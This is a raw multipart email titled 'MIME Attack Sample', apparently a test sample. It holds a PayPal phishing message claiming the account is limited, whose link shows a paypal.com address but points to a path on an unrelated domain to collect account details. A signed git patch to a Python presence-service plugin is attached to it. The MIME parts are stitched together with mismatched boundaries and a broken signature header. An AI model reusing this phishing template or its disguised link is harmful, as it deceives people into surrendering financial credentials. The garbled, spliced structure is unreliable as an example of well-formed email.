From: rightworks@rightworks.rsvp0.net
To: plragde@plg2.math.uwaterloo.ca, nishi@plg2.math.uwaterloo.ca,
Subject: MIME Attack Sample
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
Content-Type: text/html
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<title>PayPal</title>
</head>
<body bgcolor=3D"#ffffff">
<style type=3D"text/css">
dummy {}
BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
12px;color: #000000;}
LI {line-height: 120%;}
UL.ppsmallborder {margin:10px 5px 10px 20px;}
LI.ppsmallborderli {margin:0px 0px 5px 0px;}
UL.pp_narrow {margin:10px 5px 0px 40px;}
hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted 
#ccc;}
pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
10px;font-weight: bold;color: #000000;}
pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
#000000;}
pp_serif{font-family: serif;font-size: 16px;color: #000000;}
pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
16px;color: #000000;}
pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
18px;font-weight: bold;color: #003366;}	
pp_subheadingeoa {font-family:
verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: 
bold;color:
#000000;}	
pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:=

16px;font-weight: bold;color: #003366;}	
pp_sidebartext {font-family: 
verdana,arial,helvetica,sans-serif;font-size:
11px;color: #003366;}	
pp_sidebartextbold {font-family:
verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: 
bold;color:
#003366;}	
pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
11px;color: #aaaaaa;}
pp_button {font-size: 13px; font-family:
verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;=

color:#000000; background-color: #cccccc;}
pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
10px;color: #000000;}
pp_smallersidebar {font-family:
verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
ppem106 {font-weight: 700;}
</style>
<table width=3D"600" cellspacing=3D"0" cellpadding=3D"0" border=3D"0"
align=3D"center">
	<tr valign=3D"top">
		<td><A href=3D"https://www.paypal.com/us"><IMG
src=3D"http://images.paypal.com/en_US/i/logo/email_logo.gif" 
alt=3D"PayPal"
border=3D"0"></A>
		</td>
	</tr>
</table>
<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<tr>
	<td background=3D"http://images.paypal.com/images/bg_clk.gif"
width=3D100%><img src=3D"http://images.paypal.com/images/pixel.gif" 
height=3D"29"
width=3D"1" border=3D"0"></td>
</tr>	
<tr>
	<td><img src=3D"http://images.paypal.com/images/pixel.gif" 
height=3D"10"
width=3D"1" border=3D"0"></td>
</tr>
</table>
<table width=3D"600" cellspacing=3D"0" cellpadding=3D"0" border=3D"0"
align=3D"center">
	<tr valign=3D"top">
		<td width=3D"400">
			<table width=3D"100%" cellspacing=3D"0" 
cellpadding=3D"5" border=3D"0">
				<tr valign=3D"top">
					<td><table width=3D"100%" 
cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
	<tr>

	
	

			<p>Dear <strong>PayPal Customer</strong>,<br>
			<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, 
sans-serif"><strong>Paypal</strong> is constantly working to ensure 
security by regulary screening the accounts in our system.We recently 
reviewed your account,and we need more information to help us provide you =

with secure service.Until we can collect this information,your access to 
sensitive account features will be limited.We would like to restore your 
acces as soon as possible,and we apologize for the inconvenience.<br><br>
  <strong>Why is my account access limited?</strong><br><br>
  Your account access has been limited for the following 
reason(s):<br><br>
		     
		      <strong><font size=3D"2" face=3D"Verdana, Arial, 
Helvetica, sans-serif"><strong><font color=3D"#ff0000">
							
</strong></font></strong>We would like to ensure that your account was not=
 
accessed by an unauthorized third party.Becouse protecting the security of=
 
your account is our primary concern,we have limited access to sensitive 
Paypal account features.We understanding that this may be an inconvenience=
 
but please understand that this temporary limitation is for your 
protection.<br><br>

(Your case ID for this reason is PP-241-615-333.) <br><br>
              

Completing all of the checklist items will automatically restore your acco=
unt access. <br><br>
			You must <strong>click the link below</strong> and 
enter your information to review your account:<br><br>
</p><table align=3D"center" bgcolor=3D"#FFE65C" border=3D"0" cellpadding=3D=
"1" 
cellspacing=3D"0" width=3D"600"><tr><td><table align=3D"center" 
bgcolor=3D"#FFFECD" border=3D"0" cellpadding=3D"9" cellspacing=3D"2" 
width=3D"100%"><tr><td align=3D"center" class=3D"sansSerif"><a 
href=3D"http://asocigas.com/www.paypal.com/index.html">https://www.paypal.=
com/cgi-bin/ssl/webscr.php?cmd=3Drestore-account-login43689473fgh5g4HGGTYG=
TCCL <br><br>( Secure Link ) <br> </a></td></tr></table></td></tr></table>=
<br/><br>

 <TBODY>
        <TR>
          <TD>
            <HR color=3D#d2d3d2 noShade>
          </TD></TR>
        <TR><TD><P><FONT size=3D1><FONT face=3DArial></FONT></TD></P></TR>=

          <TD></P></TD></TR></TBODY>
          <TD><A
<IMG
src=3D"http://pw2.netcom.com/~bultpruf/images/paypal.gif" 
border=3D0></A></TR>
          </TD>
</TABLE></FONT></P></TD></TR></TBODY></TABLE></BODY></HTML>






----95812041261031767853--
Content-Disposition: attachment; filename=signature.asc
Content-Type: text/plain
-BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- ---
 services/presence/server_plugin.py |   56 +++++++++++++++++++++++++++---------
 1 files changed, 42 insertions(+), 14 deletions(-)

diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
index 49280e3..2871df8 100644
- --- a/services/presence/server_plugin.py
+++ b/services/presence/server_plugin.py
@@ -905,24 +905,52 @@ class ServerPlugin(gobject.GObject):
         _logger.debug("Handle %s: current activity now %s" % (handle, activity))
         self._buddy_properties_changed_cb(handle, prop)
 
- -    def _new_channel_cb(self, object_path, channel_type, handle_type, handle, suppress_handler):
+    def _new_channel_cb(self, object_path, channel_type, handle_type, handle,
+                        suppress_handler):
         """Handle creation of a new channel
         """
- -        if handle_type == CONNECTION_HANDLE_TYPE_ROOM and channel_type == CHANNEL_TYPE_TEXT:
- -            channel = Channel(self._conn._dbus_object._named_service, object_path)
+        if (handle_type == CONNECTION_HANDLE_TYPE_ROOM and
+            channel_type == CHANNEL_TYPE_TEXT):
+            def ready(channel):
 
- -            # hack
- -            channel._valid_interfaces.add(CHANNEL_INTERFACE_GROUP)
- -
- -            current, local_pending, remote_pending = channel[CHANNEL_INTERFACE_GROUP].GetAllMembers()
- -            
- -            if local_pending:
- -                for act_id, act_handle in self._activities.items():
+                for act_id, act_handle in self._activities.iteritems():
                     if handle == act_handle:
- -                        self.emit("activity-invitation", act_id)
- -
- -        elif handle_type == CONNECTION_HANDLE_TYPE_CONTACT and \
- -            channel_type in [CHANNEL_TYPE_TEXT, CHANNEL_TYPE_STREAMED_MEDIA]:
+                        break
+                    else:
+                        return
+
+                def members_changed(message, added, removed, local_pending,
+                                    remote_pending, actor, reason):
+                    # FIXME: if contacts were added, who don't have this
+                    # activity in their PEP node for whatever reason, then
+                    # emit buddy-activities-changed for them (otherwise they
+                    # could be in an activity while pretending they weren't,
+                    # which would be crazy)
+                    pass
+
+                def got_all_members(current, local_pending, remote_pending):
+                    if local_pending:
+                        for act_id, act_handle in self._activities.iteritems():
+                            if handle == act_handle:
+                                self.emit('activity-invitation', act_id)
+                def got_all_members_err(e):
+                    logger.debug('Unable to get channel members for %s:',
+                                 object_path, exc_info=1)
+
+                # hook the MembersChanged signal so we get told when people
+                # join/leave
+                group = channel[CHANNEL_INTERFACE_GROUP]
+                group.connect_to_signal('MembersChanged', members_changed)
+                group.GetAllMembers(reply_handler=got_all_members,
+                                    error_handler=got_all_members_err)
+
+            # we throw away the channel as soon as ready() finishes
+            Channel(self._conn.service_name, object_path,
+                    ready_handler=ready)
+
+        elif (handle_type == CONNECTION_HANDLE_TYPE_CONTACT and
+              channel_type in (CHANNEL_TYPE_TEXT,
+                               CHANNEL_TYPE_STREAMED_MEDIA)):
             self.emit("private-invitation", object_path)
 
     def update_activity_properties(self, act_id):
- -- 
1.5.2-rc3.GIT

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net

iD8DBQFGVXq3WSc8zVUw7HYRAuSGAKC2exySPjDM1VQ+3g6/2LIsvCrPigCgvGWs
nCJ3O+BD29et0Rb5vaiMRko=
=kx/X
-----END PGP SIGNATURE-----
_____-BOUNDARY--
